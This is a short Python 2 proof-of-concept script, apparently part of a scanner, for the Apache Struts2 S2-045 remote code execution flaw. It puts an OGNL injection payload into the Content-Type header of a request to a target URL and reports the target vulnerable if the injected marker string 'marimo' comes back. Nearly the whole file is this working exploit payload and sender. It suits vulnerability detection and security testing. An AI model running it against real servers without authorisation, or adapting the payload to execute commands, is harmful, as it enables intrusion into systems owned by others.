__author__ = 'luhaoliang'
"""
Struts2 S2-045远程代码执行漏洞PoC

"""

import urllib2


def poc(target,timeout=3):
    flag = 'Struts2 S2-045 Vulnerable'
    payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('['+'marimo'+']')).(#o.close())}"
    try:
        request = urllib2.Request(target)
        request.add_header("Content-Type", payload)

    except:
        return [0, flag]
    res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
    if "marimo" in res_html:
        return [1,flag]
    return [0,flag]